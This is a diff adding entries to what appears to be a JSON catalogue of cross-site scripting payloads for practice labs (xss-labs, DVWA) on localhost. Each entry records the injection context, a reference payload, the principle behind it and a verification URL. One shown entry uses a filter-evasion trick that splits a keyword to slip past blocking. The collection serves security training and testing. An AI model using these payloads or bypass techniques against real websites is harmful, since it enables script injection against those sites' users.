@@ -401,5 +401,29 @@
     "principle": "空格被替换为 &nbsp;（非法属性分隔符）时改用换行 %0A/制表符 %09 分隔属性；用 onerror 事件绕开 script 关键字",
     "source": "xss-labs",
     "verify_url": "http://localhost:8080/level16.php?keyword=%3Cimg%0Asrc%3Dx%0Aonerror%3Dtop%5B%22pr%22%2B%22ompt%22%5D(1)%3E&r=1621"
+  },
+  {
+    "id": "auto-20261029201950",
+    "context": "DVWA low 反射型，name 参数原样反射进 \"Hello {input}\" HTML 文本节点，无过滤无编码",
+    "reference_payload": "<script>alert(document.domain)</script>",
+    "principle": "HTML 文本节点上下文，无过滤直接注入 script 标签",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/xss_r/?name={payload}"
+  },
+  {
+    "id": "auto-20261029213655",
+    "context": "DVWA low xss_s: guestbook message textarea (mtxMessage) stored raw in DB with no filtering; name field txtName; reflected unsanitized in guestbook page on every visit",
+    "reference_payload": "<img src=x onerror=alert(document.domain)>",
+    "principle": "stored raw input, no output encoding, persisted XSS executes on each page load",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/xss_s/"
+  },
+  {
+    "id": "auto-20261029213706",
+    "context": "DVWA low xss_d: `default` GET parameter reflected into document.write of a <select> option without sanitization; low.php checks default param and document.write's it into page",
+    "reference_payload": "<script>alert(document.domain)</script>",
+    "principle": "DOM XSS: default URL param flows to document.write sink unescaped",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/xss_d/?default={payload}"
   }
 ]
